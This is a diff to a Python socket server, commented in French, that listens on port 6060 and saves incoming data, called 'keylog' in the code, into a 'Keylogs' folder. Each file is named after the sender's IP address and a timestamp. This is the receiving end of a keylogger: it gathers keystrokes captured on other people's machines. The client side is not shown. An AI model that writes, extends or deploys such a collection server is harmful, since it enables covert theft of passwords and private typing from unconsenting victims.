@@ -1,5 +1,7 @@
 import socket
 import os
+from datetime import datetime
+
 
 def receive_file(filename, client_socket, destination_folder):
     full_path = os.path.join(destination_folder, filename)
@@ -10,38 +12,44 @@ def receive_file(filename, client_socket, destination_folder):
                 break
             file.write(keylog)
 
-def main():
-    server_address = '0.0.0.0'  # Adresse IP du serveur
-    server_port = 6060  # Port du serveur
-    destination_folder = "fichiers_recus"  # Répertoire de destination des fichiers reçus
+server_port = 6060  
+save_folder = "Keylogs"  
 
-    # Création du répertoire de destination s'il n'existe pas
-    if not os.path.exists(destination_folder):
-        os.makedirs(destination_folder)
+# Création du répertoire de sauvegarde
+if not os.path.exists(save_folder):
+    os.makedirs(save_folder)
 
-    # Création d'un socket serveur
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-        # Liaison du socket à l'adresse et au port souhaités
-        server_socket.bind((server_address, server_port))
+# Création d'un socket serveur
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+    # Liaison du socket à l'adresse et au port souhaité
+    server_socket.bind(('', server_port))
 
-        # Écoute des connexions entrantes
-        server_socket.listen(5)
-        print("Le serveur est prêt à écouter les connexions entrantes.")
+    # Écoute des connexions entrantes
+    server_socket.listen(5)
+    print("Le serveur est prêt à écouter les connexions entrantes.")
 
-        try:
-            while True:
-                # Attente d'une connexion entrante
-                client_socket, client_address = server_socket.accept()
-                print("Nouvelle connexion entrante:", client_address)
+    try:
+        while True:
+            # Attente d'une connexion entrante
+            client_socket, client_address = server_socket.accept()
+            
+            # IP du client
+            client_ip = client_address[0]
 
-                # Réception du fichier envoyé par le client
-                filename = "fichier_recu.txt"  # Nom du fichier reçu
-                receive_file(filename, client_socket, destination_folder)
+            # Heure actuelle
+            heure_actuelle = datetime.now()
+            # Formatage de l'heure actuelle
+            heure_formattee = heure_actuelle.strftime("%Y-%m-%d_%H-%M-%S")
+            # Remplacement des caractères non valides dans le nom du fichier
+            heure_formattee = heure_formattee.replace(":", "-").replace(" ", "/")
 
-                print("Fichier reçu et enregistré avec succès:", filename)
+            print("Nouvelle connexion entrante:", client_address)
 
-        except KeyboardInterrupt:
-            print("Arrêt du serveur.")
+            # Réception du fichier envoyé par le client
+            filename = f"{client_ip}-{heure_formattee}-keyboard.txt"
+            receive_file(filename, client_socket, save_folder)
 
-if __name__ == "__main__":
-    main()
+            print("Fichier reçu et enregistré avec succès:", filename)
+
+    except KeyboardInterrupt:
+        print("Arrêt du serveur.")
